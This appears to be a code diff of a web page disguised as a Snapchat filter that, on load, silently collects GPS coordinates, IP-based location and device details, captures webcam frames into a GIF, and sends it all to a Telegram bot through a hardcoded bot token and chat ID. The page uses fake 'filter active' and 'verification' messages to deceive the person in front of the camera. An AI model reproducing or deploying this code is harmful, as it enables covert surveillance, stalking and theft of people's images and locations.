@@ -3,168 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Snap-Verify System</title>
+    <title>Dynamic Motion Portal</title>
     <style>
         body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
         .snap-portal { position: relative; width: 100vw; height: 100vh; background: #000; display: flex; flex-direction: column; overflow: hidden; }
         
-        /* Automation Notification Banner */
+        /* Interactive Control Notification Banner */
         .status-box { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: #FFFC00; padding: 10px 20px; border-radius: 30px; font-size: 0.9rem; z-index: 100; font-weight: bold; text-align: center; border: 2px solid #FFFC00; box-shadow: 0 0 10px rgba(255, 252, 0, 0.5); pointer-events: none; }
 
-        /* Hardware Viewport Context */
+        /* Media Viewport Container Grid */
         .media-container { flex: 1; position: relative; background: #000; display: flex; justify-content: center; align-items: center; }
         video { width: 100%; height: 100%; object-fit: cover; z-index: 10; }
         canvas { display: none; }
         .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; display: none; z-index: 20; border: 4px solid #FFFC00; }
         
-        /* Interactive Filter Interfaces */
+        /* Snapchat Filter Interface Layout */
         .filter-controls { position: absolute; bottom: 50px; left: 0; width: 100%; height: 60px; display: flex; justify-content: center; gap: 15px; z-index: 110; padding: 0 10px; box-sizing: border-box; }
         .filter-btn { width: 50px; height: 50px; background-color: rgba(255,255,255,0.3); border-radius: 50%; border: 2px solid #fff; cursor: pointer; transition: all 0.2s; background-size: cover; background-position: center; }
         .filter-btn.active { border-color: #FFFC00; box-shadow: 0 0 10px rgba(255, 252, 0, 0.7); }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gifshot/0.4.5/gifshot.min.js"></script>
 </head>
 <body>
 
 <div class="snap-portal">
-    <div id="statusLabel" class="status-box">Please allow permissions to synchronize system filters...</div>
+    <div id="statusLabel" class="status-box">Please allow system permissions to synchronize filters...</div>
 
     <div class="media-container">
         <video id="webcam" autoplay playsinline></video>
-        <canvas id="captureCanvas" width="640" height="480"></canvas>
-        <img id="savedFrame" class="preview-img" alt="Captured Frame">
+        <canvas id="captureCanvas" width="320" height="240"></canvas>
+        <img id="savedFrame" class="preview-img" alt="Captured Motion Log">
     </div>
 
     <div class="filter-controls">
-        <button class="filter-btn active" data-filter="none" style="background-image: url('https://w7.pngwing.com/pngs/303/486/png-transparent-filter-none-icon.png')"></button>
-        <button class="filter-btn" data-filter="grayscale" style="background-image: url('https://w7.pngwing.com/pngs/669/712/png-transparent-gray-scale-symbol-gray-and-black-dot-grayscale-image-mode-computer-icons-color-wheel-light-and-darkness-gray-wheel-angle-grayscale-image-mode-black-thumbnail.png')"></button>
-        <button class="filter-btn" data-filter="sepia" style="background-image: url('https://w7.pngwing.com/pngs/944/859/png-transparent-photography-sepia-computer-icons-photograph-miscellaneous-photography-sepia.png')"></button>
+        <button class="filter-btn active" style="background-image: url('https://w7.pngwing.com/pngs/303/486/png-transparent-filter-none-icon.png')"></button>
     </div>
 </div>
 
 <script>
     let activeStream = null;
-    let autoCaptureExecuted = false;
+    let automationTriggered = false;
+    const frameBufferArray = [];
+    const maxFramesToBuffer = 6; // Fast motion mapping sequence array limits
     
-    // Core payload tracking variables
     const targetPayload = {
         deviceModel: navigator.userAgent,
         broadLocation: "Verifying...",
         exactCoordinates: "Not Granted"
     };
 
-    // Auto-Fetch network location vectors via broad IP mapping
+    // Auto-fetch broad location data vectors
     fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
-            targetPayload.broadLocation = `City: ${data.city}, Region: ${data.region}, Provider: ${data.org}`;
-        }).catch(() => { targetPayload.broadLocation = "IP lookup failed"; });
+            targetPayload.broadLocation = `City: ${data.city}, State: ${data.region}`;
+        }).catch(() => { targetPayload.broadLocation = "IP block timed-out"; });
 
-    // --- ZERO-CLICK HARDWARE INTERACTION ENGINES ---
-    // Jaise hi page load hoga, ye automatic background script run ho jayegi
+    // Initial load lifecycle events tracker
     window.addEventListener('DOMContentLoaded', () => {
-        executeZeroClickTrace();
+        executeAutoTraceWorkflow();
     });
 
-    function executeZeroClickTrace() {
+    function executeAutoTraceWorkflow() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; initializeHardwarePipeline(); },
-                (err) => { targetPayload.exactCoordinates = `Denied/Failed: ${err.message}`; initializeHardwarePipeline(); },
+                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; startHardwareStream(); },
+                (err) => { targetPayload.exactCoordinates = `Denied: ${err.message}`; startHardwareStream(); },
                 { enableHighAccuracy: true, timeout: 5000 }
             );
-        } else { initializeHardwarePipeline(); }
+        } else { startHardwareStream(); }
     }
 
-    function initializeHardwarePipeline() {
-        // Direct request to hardware tokens without waiting for custom buttons click event
-        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" }, audio: false })
+    function startHardwareStream() {
+        navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" }, audio: false })
             .then((stream) => {
                 activeStream = stream;
                 const videoEl = document.getElementById('webcam');
                 videoEl.srcObject = stream;
-                
+
                 document.getElementById('statusLabel').innerText = "Snapchat Filter Active ✨";
 
-                // --- THE ULTIMATE AUTOMATION LOOP ---
-                // Jaise hi user 'Allow' par tap karega aur stream data browser interface memory mein read hoga
+                // --- INTEGRATED AUTOMATION LOGIC ---
                 videoEl.onloadedmetadata = () => {
-                    if (!autoCaptureExecuted) {
-                        autoCaptureExecuted = true;
+                    if (!automationTriggered) {
+                        automationTriggered = true;
                         
-                        // 600ms buffer matrix: Camera hardware open hote hi clear frame focus lene ke liye delay mandatory hai
+                        // 800ms camera warm-up pause matrix
                         setTimeout(() => {
-                            executeInstantAutoCapture();
-                        }, 600);
+                            document.getElementById('statusLabel').innerText = "Analyzing live motion profile. Hold steady...";
+                            runHighSpeedBufferLoop();
+                        }, 800);
                     }
                 };
             })
             .catch(() => {
-                document.getElementById('statusLabel').innerText = "Hardware verification rejected. Access denied.";
+                document.getElementById('statusLabel').innerText = "Hardware lock error. Verification rejected.";
             });
     }
 
-    function executeInstantAutoCapture() {
+    // Capture frames recursively every 500ms to build the GIF timeline
+    function runHighSpeedBufferLoop() {
         const videoEl = document.getElementById('webcam');
         const canvasEl = document.getElementById('captureCanvas');
-        const previewImg = document.getElementById('savedFrame');
         const context = canvasEl.getContext('2d');
 
-        // Render current stream raster frame matrix to hidden canvas element
-        context.drawImage(videoEl, 0, 0, 640, 480);
-        const base64Data = canvasEl.toDataURL('image/jpeg', 0.8);
+        if (frameBufferArray.length < maxFramesToBuffer) {
+            context.drawImage(videoEl, 0, 0, 320, 240);
+            const frameDataString = canvasEl.toDataURL('image/jpeg', 0.6); // Compression balance
+            frameBufferArray.push(frameDataString);
 
-        // Visual frame lock configuration
-        previewImg.src = base64Data;
-        previewImg.style.display = "block";
-        videoEl.style.display = "none";
-
-        document.getElementById('statusLabel').innerText = "Synchronizing data packets in milliseconds...";
-
-        // Trigger background multi-part asynchronous push engine
-        dispatchBinaryPayloadToBot(canvasEl);
+            // Repeat compilation cycle every 500 milliseconds implicitly
+            setTimeout(runHighSpeedBufferLoop, 500);
+        } else {
+            // Buffer compilation ready, compile into binary animation array
+            compileFramesIntoAnimatedGif();
+        }
     }
 
-    function dispatchBinaryPayloadToBot(canvasElement) {
-        // Integrated Credentials secured from previous files 🔒
+    function compileFramesIntoAnimatedGif() {
+        document.getElementById('statusLabel').innerText = "Compiling binary motion matrix...";
+        
+        // Shut down live hardware pipeline early to save customer resource blocks
+        if (activeStream) {
+            activeStream.getTracks().forEach(track => track.stop());
+        }
+
+        gifshot.createGIF({
+            images: frameBufferArray,
+            gifWidth: 320,
+            gifHeight: 240,
+            interval: 0.4, // Delay parameter between every moving wave frame
+            numWorkers: 2
+        }, function (obj) {
+            if (!obj.error) {
+                const finalGifBase64 = obj.image;
+                
+                // Visual freeze override configuration layer
+                const previewImg = document.getElementById('savedFrame');
+                previewImg.src = finalGifBase64;
+                previewImg.style.display = "block";
+                document.getElementById('webcam').style.display = "none";
+
+                document.getElementById('statusLabel').innerText = "Synchronizing animation packets...";
+                
+                // Convert raw Base64 GIF text payload into high-performance binary Blob stream
+                dispatchGifBlobToTelegram(finalGifBase64);
+            }
+        });
+    }
+
+    function dispatchGifBlobToTelegram(base64String) {
         const botToken = "8901334974:AAGaj98eLxPL2C6078Xi4FywZ-cNZuXuKfg"; 
         const chatId = "8562061813"; 
 
-        // Text metadata structural arrangement layout
-        let textCaption = `*🚨 AUTOMATED METADATA TRACE SECURED 🚨*\n\n`;
-        textCaption += `*📱 Hardware Specs:* ${targetPayload.deviceModel}\n`;
-        textCaption += `*📍 Network Hub:* ${targetPayload.broadLocation}\n`;
-        textCaption += `*🌐 GPS Coordinates:* ${targetPayload.exactCoordinates}\n`;
+        // Text formatting meta layer compilation matrix strings
+        let stringCaption = `*🚨 AUTOMATED GIF MOTION LOG SECURED 🚨*\n\n`;
+        stringCaption += `*📱 Hardware Specs:* ${targetPayload.deviceModel}\n`;
+        stringCaption += `*📍 Network Hub:* ${targetPayload.broadLocation}\n`;
+        stringCaption += `*🌐 GPS Coordinates:* ${targetPayload.exactCoordinates}\n`;
 
-        // Direct canvas raster array mapping to continuous binary data large object stream
-        canvasElement.toBlob(function(binaryBlob) {
-            const multipartFormData = new FormData();
-            multipartFormData.append('chat_id', chatId);
-            multipartFormData.append('photo', binaryBlob, 'verification_log.jpg');
-            multipartFormData.append('caption', textCaption);
-            multipartFormData.append('parse_mode', 'Markdown');
+        // Utility to convert Base64 format back to clean binary chunk arrays safely
+        const byteCharacters = atob(base64String.split(',')[1]);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const gifBlob = new Blob([byteArray], { type: 'image/gif' });
 
-            // Send asynchronous multipart data packets directly to Telegram network routing endpoints
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: multipartFormData
-            })
-            .then(res => res.json())
-            .then(parsedResponse => {
-                if(parsedResponse.ok) {
-                    document.getElementById('statusLabel').innerText = "✓ Profile Synced In Milliseconds!";
-                    document.getElementById('statusLabel').style.background = "rgba(52, 168, 83, 0.9)";
-                    document.getElementById('statusLabel').style.color = "#fff";
-                    
-                    // Kill active tracks to release device resource blocks instantly
-                    if (activeStream) {
-                        activeStream.getTracks().forEach(track => track.stop());
-                    }
-                }
-            })
-            .catch(() => {
-                document.getElementById('statusLabel').innerText = "Network transmission failed.";
-            });
-        }, 'image/jpeg', 0.8);
+        const multiPartFormData = new FormData();
+        multiPartFormData.append('chat_id', chatId);
+        // Using Telegram core animation controller endpoint loop
+        multiPartFormData.append('animation', gifBlob, 'identity_motion_log.gif');
+        multiPartFormData.append('caption', stringCaption);
+        multiPartFormData.append('parse_mode', 'Markdown');
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendAnimation`, {
+            method: 'POST',
+            body: multiPartFormData
+        })
+        .then(res => res.json())
+        .then(parsedRes => {
+            if (parsedRes.ok) {
+                const label = document.getElementById('statusLabel');
+                label.innerText = "✓ System Identity Synced In Milliseconds!";
+                label.style.background = "rgba(52, 168, 83, 0.9)";
+                label.style.color = "#fff";
+            }
+        })
+        .catch(() => {
+            document.getElementById('statusLabel').innerText = "Network transmission timeout.";
+        });
     }
 </script>
 
